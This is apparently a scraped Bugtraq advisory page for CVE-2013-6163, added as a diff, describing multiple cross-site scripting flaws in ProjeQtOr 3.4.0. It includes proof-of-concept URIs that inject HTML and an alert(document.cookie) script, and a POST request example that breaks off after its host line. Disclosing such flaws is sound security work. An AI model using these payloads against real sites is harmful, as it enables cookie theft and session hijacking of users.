@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid63539<p><b><span style="font-size: 18pt;">ProjeQtOr CVE-2013-6163 Multiple Cross Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/63539/info">info</a><br><a href="http://www.securityfocus.com/bid/63539/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/63539/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/63539/solution">solution</a><br><a href="http://www.securityfocus.com/bid/63539/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				63539
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2013-6163<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 05 2013 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 05 2013 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Vicente Aguilera Diaz
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					ProjeQtOr ProjeQtOr  3.4.0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker must trick a victim into following a malicious URI to exploit multiple cross-site scripting issues.<br/><br/>The following example URIs and request are available:<br/><br/>http://www.example.com/view/parameter.php?type="&amp;gt;&amp;lt;H1&amp;gt;&amp;lt;marquee&amp;gt;This+is+an+XSS+example&amp;lt;!--<br/><br/>http://www.example.com/view/main.php?directAccessPage=parameter.php&amp;amp;menuActualStatus=visible&amp;amp;p1name=test&amp;amp;p1value=");alert(document.cookie);<br/><br/>(POST Request)<br/>POST /view/objectDetail.php?destinationWidth=1017 HTTP/1.1<br/>Host: www.example.com
+	
+		<ul>
+</ul>
+</div>
